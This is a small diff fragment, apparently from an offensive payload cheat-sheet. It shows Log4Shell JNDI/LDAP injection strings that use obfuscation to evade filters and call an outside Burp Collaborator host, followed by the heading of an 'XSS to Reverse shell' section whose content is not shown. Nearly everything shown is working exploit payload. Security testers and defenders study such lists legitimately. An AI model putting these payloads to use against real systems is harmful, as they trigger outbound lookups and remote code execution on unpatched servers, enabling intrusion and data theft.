@@ -2,7 +2,7 @@
 ``
 ${jndi:ldap://${command}XXXX${::-.}burpcollab.net}zzzz
 
-${jndi:ldap://${command}XXXX${::-.}99gabkspyjhuqr69989p8ivwun0eo3.burpcollaborator.net}zzzz
+${jndi:ldap://${command}XXXX${::-.}.burpcollaborator.net}zzzz
 ```
 ## XSS to Reverse shell:
 ```
